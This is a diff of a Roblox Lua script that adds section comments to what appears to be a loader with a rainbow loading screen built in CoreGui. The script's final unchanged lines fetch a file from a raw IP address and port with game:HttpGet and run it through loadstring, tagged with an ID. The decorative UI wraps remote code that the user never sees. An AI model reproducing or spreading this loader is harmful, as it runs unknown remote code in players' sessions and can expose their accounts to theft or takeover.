@@ -1,3 +1,4 @@
+--// Services
 local Players = game:GetService("Players")
 local TweenService = game:GetService("TweenService")
 local CoreGui = game:GetService("CoreGui")
@@ -5,6 +6,7 @@ local Lighting = game:GetService("Lighting")
 
 local player = Players.LocalPlayer
 
+--// Rainbow color cycle
 local function rainbowText(label)
     task.spawn(function()
         local hue = 0
@@ -16,7 +18,7 @@ local function rainbowText(label)
     end)
 end
 
-
+-- Rainbow bar animation
 local function rainbowBar(frame)
     task.spawn(function()
         local hue = 0
@@ -28,7 +30,7 @@ local function rainbowBar(frame)
     end)
 end
 
-
+--// Loader UI
 local function createLoadingScreen()
     local blur = Instance.new("BlurEffect")
     blur.Size = 0
@@ -136,7 +138,7 @@ local function createLoadingScreen()
     end)
 end
 
-
+--// Execute script
 createLoadingScreen()
 ID="7c405e5d-50f2-4452-bf64-da28488409b3";
 loadstring(game:HttpGet("http://109.71.240.235:3910/cdn/loader.luau"))()
